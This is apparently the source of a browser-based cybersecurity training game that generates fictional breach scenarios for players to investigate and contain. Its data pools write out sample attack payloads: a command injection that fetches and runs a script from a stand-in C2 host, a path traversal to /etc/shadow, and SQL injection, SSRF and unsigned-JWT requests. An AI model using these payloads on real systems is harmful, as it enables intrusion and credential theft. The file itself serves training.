/**
 * PROJECT ZERO HOUR — Procedural Cyber Incident Simulator & Tactical Escape Room
 * Every operation dynamically generates a brand-new, internally consistent cyber breach:
 * - Procedural Threat Actor, Attacker C2 IP, Geo-Origin & C2 Domain
 * - Procedural Initial Access Exploit & HTTP Request/Header Forensics
 * - Procedural Rogue Hidden Service Port, Process & Lateral Movement Path
 * - Procedural Credential Hash for John the Ripper / Hashcat
 * - Procedural DNS TXT / Wireshark PCAP Exfiltration Payload & TLS Cert Artifact
 */

(function () {
  "use strict";

  // =========================================================================
  // 1. PROCEDURAL DATA POOLS
  // =========================================================================
  const OPERATION_CODENAMES = [
    { code: "MISSION 01", title: "The Breach", subtitle: "A suspicious activity has been detected in the corporate network. Your job is to investigate, find the source, and determine what was compromised." },
    { code: "MISSION 02", title: "Shadow Relay", subtitle: "Anomalous encrypted beacons are egressing from an internal subnet. Trace the covert channel, uncover the pivot host, and neutralize the implant." },
    { code: "MISSION 03", title: "Phantom Handshake", subtitle: "Unauthorized privilege escalation detected across core infrastructure. Reconstruct the kill chain, crack the dumped credentials, and lock down the perimeter." },
    { code: "MISSION 04", title: "Obsidian Vault", subtitle: "High-volume database reads triggered a silent canary alarm. Identify the entry vector, decode the exfiltration stream, and isolate the affected nodes." },
    { code: "MISSION 05", title: "Crimson Vector", subtitle: "Supply-chain telemetry shows a rogue daemon spawned on production hosts. Hunt the backdoor port, inspect the packet capture, and file your incident report." }
  ];

  const THREAT_ACTORS = [
    { name: "APT-412 (Nightshade)", ip: "185.220.101.47", country: "Frankfurt Relay, DE", c2Domain: "cdn-telemetry-sync.net", asn: "AS205100 F3 Netze e.V.", mapCoords: { x: 54, y: 31 } },
    { name: "UNC-889 (Volt Specter)", ip: "91.214.124.88", country: "Bucharest Node, RO", c2Domain: "auth-cloud-verify.io", asn: "AS39743 Voxility LLP", mapCoords: { x: 58, y: 34 } },
    { name: "Lazarus-Echo", ip: "45.155.205.19", country: "Vladivostok Edge, RU", c2Domain: "edge-metrics-api.org", asn: "AS49505 Selectel Network", mapCoords: { x: 78, y: 29 } },
    { name: "Crimson Spider", ip: "194.26.135.72", country: "Zurich Darknet Exit, CH", c2Domain: "kube-update-mirror.com", asn: "AS51852 Private Layer", mapCoords: { x: 52, y: 33 } },
    { name: "Sandworm-V", ip: "103.145.13.99", country: "Singapore Transit, SG", c2Domain: "sys-patch-distributor.net", asn: "AS138915 Kaopu Cloud", mapCoords: { x: 74, y: 58 } },
    { name: "DarkHydra Collective", ip: "179.43.176.210", country: "Sao Paulo Proxy, BR", c2Domain: "vault-sync-gateway.org", asn: "AS262287 Maxihost", mapCoords: { x: 35, y: 68 } }
  ];

  const BENIGN_IPS = [
    "10.10.1.14", "10.10.3.22", "10.10.4.10", "172.16.0.5", "198.51.100.42", "203.0.113.19"
  ];

  const EXPLOIT_VECTORS = [
    {
      id: "SQLI",
      name: "SQL Injection",
      shortTag: "SQLi",
      uri: "/api/v2/accounts?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20admin_users--",
      method: "GET",
      status: 200,
      headerClue: "X-Forwarded-Scanner: sqlmap/1.8.4-dev",
      vulnSummary: "Unparameterized SQL query in /api/v2/accounts endpoint allowed UNION-based credential extraction."
    },
    {
      id: "SSRF",
      name: "Server-Side Request Forgery",
      shortTag: "SSRF",
      uri: "/api/v1/webhook/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role",
      method: "POST",
      status: 200,
      headerClue: "X-Metadata-Bypass: internal-cloud-hop",
      vulnSummary: "Unvalidated URL fetcher in /api/v1/webhook/preview allowed internal cloud metadata IAM token theft."
    },
    {
      id: "LFI",
      name: "Path Traversal (LFI)",
      shortTag: "LFI",
      uri: "/portal/download?template=../../../../../../etc/shadow%00",
      method: "GET",
      status: 200,
      headerClue: "X-Exploit-Payload: dot-dot-slash-null",
      vulnSummary: "Unsanitized file path parameter in /portal/download exposed system shadow and configuration files."
    },
    {
      id: "RCE",
      name: "Command Injection (RCE)",
      shortTag: "RCE",
      uri: "/api/diagnostics/ping?host=127.0.0.1;curl%20-s%20http://c2/drop.sh|sh",
      method: "POST",
      status: 200,
      headerClue: "User-Agent: Mozilla/5.0 (ShellDrop/2.6)",
      vulnSummary: "Unsanitized shell concatenation in /api/diagnostics/ping permitted remote command execution as www-data."
    },
    {
      id: "JWT",
      name: "JWT Algorithm Confusion",
      shortTag: "JWT-Bypass",
      uri: "/admin/console/export-keys",
      method: "GET",
      status: 200,
      headerClue: "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoic3VwZXJhZG1pbiJ9.",
      vulnSummary: "Authentication middleware accepted unsigned 'alg: none' JWT tokens on /admin/console/export-keys."
    }
  ];

  const HIDDEN_SERVICES = [
    { port: 4444, proto: "tcp", service: "krb5-sync-backdoor", banner: "ZeroShell v2.4 (Reverse Command Channel)", process: "/tmp/.kworker_sync" },
    { port: 31337, proto: "tcp", service: "elite-beacon", banner: "GhostRat Daemon v4.1-TLS", process: "/var/tmp/.systemd-helper" },
    { port: 9001, proto: "tcp", service: "tor-orport-tunnel", banner: "ShadowRelay SOCKS5 Multiplexer", process: "/dev/shm/.pulse-daemon" },
    { port: 8443, proto: "tcp", service: "https-mgmt-rogue", banner: "C2-Implant-Listener (OpenSSL 3.1)", process: "/opt/.cron-worker" },
    { port: 6667, proto: "tcp", service: "irc-botnet-ctl", banner: "HydraBNC Command Bus v1.9", process: "/usr/local/bin/.dbus-proxy" }
  ];

  const LATERAL_PIVOTS = [
    {
      pivotNode: "DB",
      pivotIp: "10.10.2.15",
      subnet: "10.10.2.0/24",
      targetAsset: "customer_vault_2026.sql",
      lateralMethod: "SSH Key Reuse from WEB (/var/www/.ssh/id_ed25519)",
      compromiseRoute: ["INTERNET", "CORE", "WEB", "DB"]
    },
    {
      pivotNode: "DEV",
      pivotIp: "10.10.3.18",
      subnet: "10.10.3.0/24",
      targetAsset: "k8s_prod_secrets.yaml",
      lateralMethod: "Stolen CI/CD Runner Token in Environment Variables",
      compromiseRoute: ["INTERNET", "CORE", "WEB", "DEV"]
    },
    {
      pivotNode: "ADMIN",
      pivotIp: "10.10.4.21",
      subnet: "10.10.4.0/24",
      targetAsset: "root_ca_private.key",
      lateralMethod: "Pass-the-Hash via Dumped Service Account Credentials",
      compromiseRoute: ["INTERNET", "CORE", "WEB", "ADMIN"]
    }
  ];

  const CREDENTIAL_DUMPS = [
    { user: "svc_deploy", hash: "$2b$12$9vK2mQ8pL1xR4zW7tY0uCeF3gH6jK9lM2nP5qR8sT1uV4wX7yZ0a", plaintext: "ZeroHour2026!", algo: "bcrypt" },
    { user: "db_replica", hash: "5f4dcc3b5aa765d61d8327deb882cf99:8b1a9953c4611296a827abf8c47804d7", plaintext: "ShadowVault#99", algo: "NTLM-Salted" },
    { user: "sys_operator", hash: "$6$rounds=5000$saltsalt$L8pQ2wR9zX4mK7nV1bC5dF8gH3jK6lM0pQ9rS2tU5vW", plaintext: "KubeMaster$42", algo: "SHA-512-crypt" },
    { user: "sec_auditor", hash: "e99a18c428cb38d5f260853678922e03", plaintext: "Pr0d_Root_Key!", algo: "MD5-Enterprise" },
    { user: "net_admin", hash: "$2a$10$X7yZ0a9vK2mQ8pL1xR4zW7tY0uCeF3gH6jK9lM2nP5qR8sT1uV4w", plaintext: "Vanguard@7788", algo: "bcrypt" }
  ];

  // =========================================================================
  // 2. SOUND SYNTHESIZER (OPTIONAL TACTICAL AUDIO)
  // =========================================================================
  const SoundFX = {
    enabled: true,
    ctx: null,
    init() {
      if (!this.ctx && (window.AudioContext || window.webkitAudioContext)) {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        this.ctx = new AudioCtx();
      }
    },
    play(type) {
      if (!this.enabled) return;
      try {
        this.init();
        if (!this.ctx) return;
        if (this.ctx.state === "suspended") this.ctx.resume();

        const now = this.ctx.currentTime;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.connect(gain);
        gain.connect(this.ctx.destination);

        if (type === "click") {
          osc.type = "sine";
          osc.frequency.setValueAtTime(880, now);
          osc.frequency.exponentialRampToValueAtTime(440, now + 0.04);
          gain.gain.setValueAtTime(0.05, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
          osc.start(now);
          osc.stop(now + 0.045);
        } else if (type === "scan") {
          osc.type = "triangle";
          osc.frequency.setValueAtTime(320, now);
          osc.frequency.linearRampToValueAtTime(960, now + 0.14);
          gain.gain.setValueAtTime(0.06, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.15);
          osc.start(now);
          osc.stop(now + 0.16);
        } else if (type === "unlock") {
          osc.type = "sine";
          osc.frequency.setValueAtTime(523.25, now); // C5
          osc.frequency.setValueAtTime(659.25, now + 0.08); // E5
          osc.frequency.setValueAtTime(783.99, now + 0.16); // G5
          osc.frequency.setValueAtTime(1046.5, now + 0.24); // C6
          gain.gain.setValueAtTime(0.08, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.42);
          osc.start(now);
          osc.stop(now + 0.43);
        } else if (type === "alert") {
          osc.type = "sawtooth";
          osc.frequency.setValueAtTime(220, now);
          osc.frequency.setValueAtTime(180, now + 0.1);
          gain.gain.setValueAtTime(0.06, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.24);
          osc.start(now);
          osc.stop(now + 0.25);
        }
      } catch (e) {
        // Ignore audio errors on restricted autoplay
      }
    }
  };

  // =========================================================================
  // 3. SEEDED PRNG & PROCEDURAL SCENARIO GENERATOR
  // =========================================================================
  function createPRNG(seed) {
    let s = seed % 2147483647;
    if (s <= 0) s += 2147483646;
    return function () {
      s = (s * 16807) % 2147483647;
      return (s - 1) / 2147483646;
    };
  }

  function pick(rng, arr) {
    return arr[Math.floor(rng() * arr.length)];
  }

  function generateProceduralScenario(seedInput, difficultyOverride) {
    const seed = seedInput || Math.floor(Date.now() % 1000000) + Math.floor(Math.random() * 99999);
    const rng = createPRNG(seed);

    const op = pick(rng, OPERATION_CODENAMES);
    const actor = pick(rng, THREAT_ACTORS);
    const exploit = pick(rng, EXPLOIT_VECTORS);
    const hiddenSvc = pick(rng, HIDDEN_SERVICES);
    const pivot = pick(rng, LATERAL_PIVOTS);
    const cred = pick(rng, CREDENTIAL_DUMPS);

    const webHostIp = "10.10.1.12";
    const coreIp = "10.10.0.1";
    const flagCode = "ZH{" + exploit.shortTag.toUpperCase() + "_" + hiddenSvc.port + "_" + Math.floor(1000 + rng() * 8999) + "}";
    const base64Clue = btoa("EXFIL_TARGET=" + pivot.targetAsset + ";C2=" + actor.c2Domain + ";FLAG=" + flagCode);

    const difficulties = ["Beginner", "Intermediate", "Tactical Elite"];
    const difficulty = difficultyOverride || difficulties[0];

    // Build Subnet / Node definitions for the 3D Isometric Network Map
    const nodes = {
      INTERNET: {
        id: "INTERNET",
        label: "INTERNET",
        subnet: actor.ip,
        ip: actor.ip,
        role: "External Untrusted WAN / Threat Origin",
        status: "alert",
        isolated: false,
        ports: [
          { port: 443, proto: "tcp", state: "open", service: "https-c2", version: actor.c2Domain }
        ],
        processes: ["external-routing-bgp", "c2-listener (" + actor.ip + ")"]
      },
      CORE: {
        id: "CORE",
        label: "CORE",
        subnet: "10.10.0.1",
        ip: coreIp,
        role: "Core Backbone Router & Ingress Firewall",
        status: "compromised",
        isolated: false,
        ports: [
          { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.3p2" },
          { port: 53, proto: "tcp", state: "open", service: "domain", version: "CoreDNS 1.11.1" },
          { port: 443, proto: "tcp", state: "open", service: "https", version: "Envoy Gateway 1.29" }
        ],
        processes: ["root /sbin/init", "coredns -conf /etc/coredns/Corefile", "envoy -c /etc/envoy/ingress.yaml"]
      },
      WEB: {
        id: "WEB",
        label: "WEB",
        subnet: "10.10.1.0/24",
        ip: webHostIp,
        role: "Public Web Application Tier (Initial Breach Host)",
        status: "compromised",
        isolated: false,
        ports: [
          { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1" },
          { port: 80, proto: "tcp", state: "open", service: "http", version: "nginx 1.24.0" },
          { port: 443, proto: "tcp", state: "open", service: "https", version: "nginx 1.24.0" },
          { port: hiddenSvc.port, proto: hiddenSvc.proto, state: "open", service: hiddenSvc.service, version: hiddenSvc.banner, suspicious: true }
        ],
        processes: [
          "root /usr/sbin/sshd -D",
          "www-data nginx: worker process",
          "www-data " + hiddenSvc.process + " --connect " + actor.ip + ":" + hiddenSvc.port
        ]
      },
      DB: {
        id: "DB",
        label: "DB",
        subnet: "10.10.2.0/24",
        ip: "10.10.2.15",
        role: "Production Database Cluster",
        status: pivot.pivotNode === "DB" ? "compromised" : "healthy",
        isolated: false,
        ports: [
          { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1" },
          { port: 5432, proto: "tcp", state: "open", service: "postgresql", version: "PostgreSQL 16.2" },
          ...(pivot.pivotNode === "DB" ? [{ port: hiddenSvc.port, proto: "tcp", state: "open", service: "exfil-relay", version: hiddenSvc.banner, suspicious: true }] : [])
        ],
        processes: [
          "postgres /usr/lib/postgresql/16/bin/postgres",
          ...(pivot.pivotNode === "DB" ? ["postgres /tmp/.db_dump_stream -> " + pivot.targetAsset] : [])
        ]
      },
      DEV: {
        id: "DEV",
        label: "DEV",
        subnet: "10.10.3.0/24",
        ip: "10.10.3.18",
        role: "CI/CD Build & Staging Environment",
        status: pivot.pivotNode === "DEV" ? "compromised" : "healthy",
        isolated: false,
        ports: [
          { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 8.9p1" },
          { port: 8080, proto: "tcp", state: "open", service: "http-proxy", version: "GitLab Runner 16.9" },
          ...(pivot.pivotNode === "DEV" ? [{ port: hiddenSvc.port, proto: "tcp", state: "open", service: "exfil-relay", version: hiddenSvc.banner, suspicious: true }] : [])
        ],
        processes: [
          "gitlab-runner /usr/bin/gitlab-runner run",
          ...(pivot.pivotNode === "DEV" ? ["runner /tmp/.kube_stealer -> " + pivot.targetAsset] : [])
        ]
      },
      ADMIN: {
        id: "ADMIN",
        label: "ADMIN",
        subnet: "10.10.4.0/24",
        ip: "10.10.4.21",
        role: "Internal PKI & Privileged Bastion",
        status: pivot.pivotNode === "ADMIN" ? "compromised" : "healthy",
        isolated: false,
        ports: [
          { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.3p1" },
          { port: 6443, proto: "tcp", state: "open", service: "kube-apiserver", version: "Kubernetes v1.30" },
          ...(pivot.pivotNode === "ADMIN" ? [{ port: hiddenSvc.port, proto: "tcp", state: "open", service: "exfil-relay", version: hiddenSvc.banner, suspicious: true }] : [])
        ],
        processes: [
          "root /usr/local/bin/vault server -config=/etc/vault.hcl",
          ...(pivot.pivotNode === "ADMIN" ? ["root /tmp/.ca_export -> " + pivot.targetAsset] : [])
        ]
      }
    };

    // Build Realistic Server Logs (Mix of Benign Red Herrings + True Attack Chain)
    const logs = [
      { id: "L-01", time: "22:01:12", src: BENIGN_IPS[0], dst: webHostIp, proto: "HTTP", method: "GET", uri: "/index.html", status: 200, note: "Normal user page load (User-Agent: Mozilla/5.0)", suspicious: false },
      { id: "L-02", time: "22:01:45", src: BENIGN_IPS[1], dst: webHostIp, proto: "HTTP", method: "GET", uri: "/assets/app.bundle.js", status: 200, note: "Static asset delivery", suspicious: false },
      { id: "L-03", time: "22:02:19", src: BENIGN_IPS[4], dst: webHostIp, proto: "HTTP", method: "POST", uri: "/api/v1/auth/login", status: 401, note: "Single failed password typo by legitimate user (Red Herring)", suspicious: false },
      { id: "L-04", time: "22:03:04", src: actor.ip, dst: webHostIp, proto: "HTTP", method: "GET", uri: "/.env", status: 404, note: "Automated recon probe from external IP " + actor.ip, suspicious: true },
      { id: "L-05", time: "22:03:08", src: actor.ip, dst: webHostIp, proto: "HTTP", method: exploit.method, uri: exploit.uri, status: exploit.status, note: "EXPLOIT HIT! Header: " + exploit.headerClue + " (" + exploit.name + ")", suspicious: true },
      { id: "L-06", time: "22:03:22", src: webHostIp, dst: actor.ip, proto: "TCP", method: "SYN-ACK", uri: "PORT:" + hiddenSvc.port + " (" + hiddenSvc.process + ")", status: 101, note: "Outbound reverse shell established on port " + hiddenSvc.port, suspicious: true },
      { id: "L-07", time: "22:04:10", src: BENIGN_IPS[2], dst: "10.10.2.15", proto: "PGSQL", method: "SELECT", uri: "health_check()", status: 200, note: "Routine database heartbeat", suspicious: false },
      { id: "L-08", time: "22:04:51", src: webHostIp, dst: pivot.pivotIp, proto: "SSH", method: "AUTH", uri: "user=" + cred.user + " via " + pivot.lateralMethod, status: 200, note: "Lateral movement from WEB (" + webHostIp + ") to " + pivot.pivotNode + " (" + pivot.pivotIp + ")", suspicious: true },
      { id: "L-09", time: "22:05:33", src: pivot.pivotIp, dst: coreIp, proto: "DNS", method: "TXT", uri: "exfil." + actor.c2Domain + " -> " + base64Clue.slice(0, 28) + "...", status: 200, note: "Encoded DNS/PCAP exfiltration of " + pivot.targetAsset, suspicious: true },
      { id: "L-10", time: "22:06:02", src: BENIGN_IPS[3], dst: webHostIp, proto: "HTTP", method: "GET", uri: "/robots.txt", status: 200, note: "Search engine crawler indexing", suspicious: false }
    ];

    // Build 8 Progressive Challenges (matching screenshot 2/8 progress bar!)
    const challenges = [
      {
        id: "c1",
        num: 1,
        title: "Web Server Investigation",
        desc: "Analyze the web server logs and find the external attacker IP address that breached WEB.",
        category: "FORENSIC",
        xp: 50,
        question: "Enter the external Attacker IP address or Exploited Attack Type:",
        acceptedAnswers: [actor.ip.toLowerCase(), exploit.name.toLowerCase(), exploit.shortTag.toLowerCase()],
        displayAnswer: actor.ip + " (" + exploit.name + ")",
        hint: "Run `grep suspicious /var/log/nginx/access.log` in the Terminal or open the LOGS tab to spot the red exploit entry.",
        solved: false
      },
      {
        id: "c2",
        num: 2,
        title: "Hidden Service",
        desc: "Find the hidden rogue service port or process running on the internal WEB host.",
        category: "RECON",
        xp: 75,
        question: "Enter the rogue TCP port number or process path on 10.10.1.0/24:",
        acceptedAnswers: [String(hiddenSvc.port), hiddenSvc.service.toLowerCase(), hiddenSvc.process.toLowerCase()],
        displayAnswer: "Port " + hiddenSvc.port + "/tcp (" + hiddenSvc.process + ")",
        hint: "Run `nmap -sV 10.10.1.0/24` or click the Nmap tool button to scan open ports on WEB.",
        solved: false
      },
      {
        id: "c3",
        num: 3,
        title: "Lateral Movement",
        desc: "Identify which internal subnet/host the attacker pivoted into from the web server.",
        category: "ANALYSIS",
        xp: 100,
        question: "Enter the compromised pivot node name (DB, DEV, or ADMIN) or its IP:",
        acceptedAnswers: [pivot.pivotNode.toLowerCase(), pivot.pivotIp.toLowerCase(), pivot.subnet.toLowerCase()],
        displayAnswer: pivot.pivotNode + " (" + pivot.pivotIp + ")",
        hint: "Look at the glowing red path on the Isometric Network Map or inspect log entry L-08 (`netstat -tulnp`).",
        solved: false
      },
      {
        id: "c4",
        num: 4,
        title: "Credential Hash Cracking",
        desc: "Crack the leaked password hash for user `" + cred.user + "` recovered from the breach.",
        category: "CRYPTO",
        xp: 100,
        question: "Enter the cracked plaintext password for `" + cred.user + "`:",
        acceptedAnswers: [cred.plaintext.toLowerCase(), cred.user.toLowerCase()],
        displayAnswer: cred.plaintext,
        hint: "Click `John the Ripper` or `Hashcat` in YOUR TOOLS, or run `john --wordlist=rockyou.txt /var/backups/creds.dump`.",
        solved: false
      },
      {
        id: "c5",
        num: 5,
        title: "Packet & DNS Exfiltration",
        desc: "Decode the Base64 exfiltration stream captured in Wireshark / DNS TXT records.",
        category: "FORENSIC",
        xp: 125,
        question: "Enter the exfiltrated filename or the decoded ZH{...} flag:",
        acceptedAnswers: [pivot.targetAsset.toLowerCase(), flagCode.toLowerCase()],
        displayAnswer: pivot.targetAsset + " (" + flagCode + ")",
        hint: "Click `Wireshark` or `OpenSSL` in YOUR TOOLS, or run `wireshark` / `dig TXT exfil." + actor.c2Domain + "` in Terminal.",
        solved: false
      },
      {
        id: "c6",
        num: 6,
        title: "C2 Infrastructure Attribution",
        desc: "Identify the attacker's Command & Control (C2) domain or Threat Actor group.",
        category: "INTEL",
        xp: 100,
        question: "Enter the attacker's C2 domain name or APT group:",
        acceptedAnswers: [actor.c2Domain.toLowerCase(), actor.name.toLowerCase(), "apt-412", "lazarus-echo", "volt specter", "crimson spider", "sandworm-v", "darkhydra"],
        displayAnswer: actor.c2Domain + " (" + actor.name + ")",
        hint: "Check the INTEL tab or run `openssl s_client -connect " + actor.ip + ":443` in the Terminal.",
        solved: false
      },
      {
        id: "c7",
        num: 7,
        title: "Active Containment Firewall",
        desc: "Isolate the breached pivot node or block the attacker C2 IP at the perimeter firewall.",
        category: "DEFENSE",
        xp: 150,
        question: "Run `isolate " + pivot.pivotNode + "` or click 'Isolate Host' on the Network Map:",
        acceptedAnswers: ["isolated", pivot.pivotNode.toLowerCase(), actor.ip.toLowerCase(), "block"],
        displayAnswer: "Firewall Contained (" + pivot.pivotNode + " & " + actor.ip + ")",
        hint: "Click the compromised node on the Network Map and press 'Isolate Host', or type `isolate " + pivot.pivotNode + "` in Terminal.",
        solved: false
      },
      {
        id: "c8",
        num: 8,
        title: "Final Incident Report",
        desc: "Compile all forensic findings and submit the official Security Operations Incident Report.",
        category: "REPORT",
        xp: 200,
        question: "Submit the verified Incident Report in the Briefing or Challenges panel:",
        acceptedAnswers: ["report", "verified", flagCode.toLowerCase()],
        displayAnswer: "Incident Report Signed & Filed",
        hint: "Click 'File Incident Report' in the Briefing panel once you've gathered your clues!",
        solved: false
      }
    ];

    return {
      seed,
      difficulty,
      op,
      actor,
      exploit,
      hiddenSvc,
      pivot,
      cred,
      webHostIp,
      coreIp,
      flagCode,
      base64Clue,
      nodes,
      logs,
      challenges
    };
  }

  // =========================================================================
  // 4. APPLICATION STATE & COOKIE PERSISTENCE
  // =========================================================================
  const COOKIE_NAME = "zh_cookie_save_v1";
  const STORAGE_KEY = "zh_procedural_state_v1";

  let state = {
    scenario: null,
    selectedNodeId: "WEB",
    activeNav: "OVERVIEW",
    challengePage: 0, // cycles through 8 challenges in groups of 3 on Overview
    xp: 0,
    highScore: 0,
    lifetimeXp: 0,
    opsCompleted: 0,
    timerSeconds: 0,
    timerEnabled: true,
    scanlines: true,
    flaggedLogs: {},
    cmdHistory: [],
    cmdIndex: -1,
    achievements: {
      first_blood: false,
      log_analyzer: false,
      network_detective: false,
      crypto_breaker: false,
      full_compromise: false
    }
  };

  function writeCookie(name, value, maxAgeSeconds = 31536000) {
    try {
      const encoded = encodeURIComponent(JSON.stringify(value));
      document.cookie = `${name}=${encoded}; max-age=${maxAgeSeconds}; path=/; SameSite=Lax`;
    } catch (e) {
      // Ignore cookie write errors
    }
  }

  function readCookie(name) {
    try {
      const prefix = name + "=";
      const parts = (document.cookie || "").split(";");
      for (let i = 0; i < parts.length; i++) {
        const c = parts[i].trim();
        if (c.indexOf(prefix) === 0) {
          return JSON.parse(decodeURIComponent(c.substring(prefix.length)));
        }
      }
    } catch (e) {
      // Fallback to null on malformed cookie
    }
    return null;
  }

  function saveState() {
    if (!state.scenario) return;
    if (state.xp > state.highScore) {
      state.highScore = state.xp;
    }

    const payload = {
      seed: state.scenario.seed,
      difficulty: state.scenario.difficulty,
      solvedIds: state.scenario.challenges.filter(c => c.solved).map(c => c.id),
      isolatedNodes: Object.keys(state.scenario.nodes).filter(k => state.scenario.nodes[k].isolated),
      flaggedLogs: state.flaggedLogs || {},
      selectedNodeId: state.selectedNodeId || "WEB",
      xp: state.xp,
      highScore: state.highScore,
      lifetimeXp: state.lifetimeXp,
      opsCompleted: state.opsCompleted,
      timerSeconds: state.timerSeconds,
      timerEnabled: state.timerEnabled,
      scanlines: state.scanlines,
      sfxEnabled: SoundFX.enabled,
      cmdHistory: (state.cmdHistory || []).slice(-15),
      achievements: state.achievements
    };

    writeCookie(COOKIE_NAME, payload, 31536000);
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
    } catch (e) {
      // Ignore storage quota errors
    }
  }

  function loadSavedPayload() {
    const fromCookie = readCookie(COOKIE_NAME);
    if (fromCookie && fromCookie.seed) return fromCookie;
    try {
      const raw = localStorage.getItem(STORAGE_KEY);
      if (raw) {
        const parsed = JSON.parse(raw);
        if (parsed && parsed.seed) return parsed;
      }
    } catch (e) {
      // Ignore parse errors
    }
    return null;
  }

  function restoreOrStartOperation() {
    const saved = loadSavedPayload();
    if (!saved || !saved.seed) {
      startNewOperation();
      return;
    }

    const sc = generateProceduralScenario(saved.seed, saved.difficulty || "Beginner");
    // Restore solved challenges
    if (Array.isArray(saved.solvedIds)) {
      sc.challenges.forEach(ch => {
        if (saved.solvedIds.includes(ch.id)) ch.solved = true;
      });
    }
    // Restore isolated firewall nodes
    if (Array.isArray(saved.isolatedNodes)) {
      saved.isolatedNodes.forEach(nid => {
        if (sc.nodes[nid]) sc.nodes[nid].isolated = true;
      });
    }

    state.scenario = sc;
    state.selectedNodeId = saved.selectedNodeId && sc.nodes[saved.selectedNodeId] ? saved.selectedNodeId : "WEB";
    state.flaggedLogs = saved.flaggedLogs || {};
    state.xp = typeof saved.xp === "number" ? saved.xp : 0;
    state.highScore = typeof saved.highScore === "number" ? Math.max(saved.highScore, state.xp) : state.xp;
    state.lifetimeXp = typeof saved.lifetimeXp === "number" ? Math.max(saved.lifetimeXp, state.xp) : state.xp;
    state.opsCompleted = typeof saved.opsCompleted === "number" ? saved.opsCompleted : 0;
    state.timerSeconds = typeof saved.timerSeconds === "number" ? saved.timerSeconds : 0;
    state.timerEnabled = saved.timerEnabled !== false;
    state.scanlines = saved.scanlines !== false;
    if (typeof saved.sfxEnabled === "boolean") SoundFX.enabled = saved.sfxEnabled;
    if (Array.isArray(saved.cmdHistory)) {
      state.cmdHistory = saved.cmdHistory;
      state.cmdIndex = state.cmdHistory.length;
    }
    if (saved.achievements && typeof saved.achievements === "object") {
      state.achievements = Object.assign(state.achievements, saved.achievements);
    }

    const app = document.getElementById("zero-hour-app");
    if (app) app.classList.toggle("zh-scanlines", state.scanlines);

    renderAll();
    clearTerminal();
    printTerminalLine("================================================================", "color:#00e5ff");
    printTerminalLine(" PROJECT ZERO HOUR // SESSION RESTORED FROM BROWSER COOKIES", "color:#34d399;font-weight:700");
    printTerminalLine(
      ` OPERATION: ${sc.op.code} — ${sc.op.title.toUpperCase()} [SEED #${sc.seed}] | HIGH SCORE: ${state.highScore} XP | CAREER: ${state.lifetimeXp} XP`,
      "color:#fbbf24"
    );
    printTerminalLine("================================================================", "color:#00e5ff");
    printTerminalLine("Type `help` for commands, or click `↻ New Breach` anytime for a new procedural scenario.");
    runTerminalCommand("nmap -sV " + sc.nodes[state.selectedNodeId].subnet, true);
  }

  function startNewOperation(customSeed, customDiff, announceInTerm = true) {
    const sc = generateProceduralScenario(customSeed, customDiff || (state.scenario && state.scenario.difficulty) || "Beginner");
    state.scenario = sc;
    state.selectedNodeId = "WEB";
    state.challengePage = 0;
    state.xp = 0;
    state.timerSeconds = 0;
    state.flaggedLogs = {};
    // Note: High Score, Lifetime XP, Ops Completed, and unlocked Achievements persist across operations!
    saveState();
    renderAll();

    if (announceInTerm) {
      SoundFX.play("scan");
      clearTerminal();
      printTerminalLine("================================================================", "color:#00e5ff");
      printTerminalLine(" PROJECT ZERO HOUR // PROCEDURAL INCIDENT ENGINE INITIALIZED", "color:#5ceeff;font-weight:700");
      printTerminalLine(" OPERATION: " + sc.op.code + " — " + sc.op.title.toUpperCase() + " [SEED #" + sc.seed + "]", "color:#fbbf24");
      printTerminalLine(" ALERT: Anomalous traffic detected on subnet 10.10.1.0/24 (WEB)", "color:#ff2a5f");
      printTerminalLine("================================================================", "color:#00e5ff");
      printTerminalLine("Type `help` for available commands, or click any quick-command chip below.");
      runTerminalCommand("nmap -sV 10.10.1.0/24", true);
    }
  }

  // =========================================================================
  // 5. CORE GAMEPLAY MECHANICS (SOLVING CHALLENGES & ACHIEVEMENTS)
  // =========================================================================
  function solveChallenge(challengeId, reasonText) {
    const sc = state.scenario;
    const ch = sc.challenges.find(c => c.id === challengeId);
    if (!ch || ch.solved) return false;

    ch.solved = true;
    state.xp += ch.xp;
    state.lifetimeXp += ch.xp;
    if (state.xp > state.highScore) {
      state.highScore = state.xp;
    }
    if (challengeId === "c8") {
      state.opsCompleted += 1;
    }
    SoundFX.play("unlock");

    printTerminalLine(
      "\n[+] OBJECTIVE SOLVED: #" + ch.num + " " + ch.title + " (+" + ch.xp + " XP) — " + (reasonText || ch.displayAnswer),
      "color:#34d399;font-weight:700"
    );

    // Check Achievements
    if (challengeId === "c2") state.achievements.first_blood = true;
    if (challengeId === "c1") state.achievements.log_analyzer = true;
    if (challengeId === "c3" || challengeId === "c7") state.achievements.network_detective = true;
    if (challengeId === "c4" || challengeId === "c5") state.achievements.crypto_breaker = true;

    const solvedCount = sc.challenges.filter(c => c.solved).length;
    if (solvedCount >= 7) {
      state.achievements.full_compromise = true;
    }

    saveState();
    renderAll();
    showToast("Challenge Completed: " + ch.title + " (+" + ch.xp + " XP)");
    return true;
  }

  function showToast(msg) {
    const existing = document.getElementById("zh-toast");
    if (existing) existing.remove();
    const el = document.createElement("div");
    el.id = "zh-toast";
    el.style.cssText =
      "position:fixed;bottom:24px;right:24px;z-index:3000;background:linear-gradient(90deg,#062c43,#054a68);border:1px solid #00e5ff;color:#fff;padding:12px 18px;border-radius:6px;font-family:var(--zh-font-mono);font-size:12px;box-shadow:0 8px 28px rgba(0,229,255,0.4);display:flex;align-items:center;gap:10px;";
    el.innerHTML = `<span style="color:#34d399;font-weight:800;">[✓]</span> <span>${escapeHtml(msg)}</span>`;
    const host = document.getElementById("zero-hour-app") || document.body;
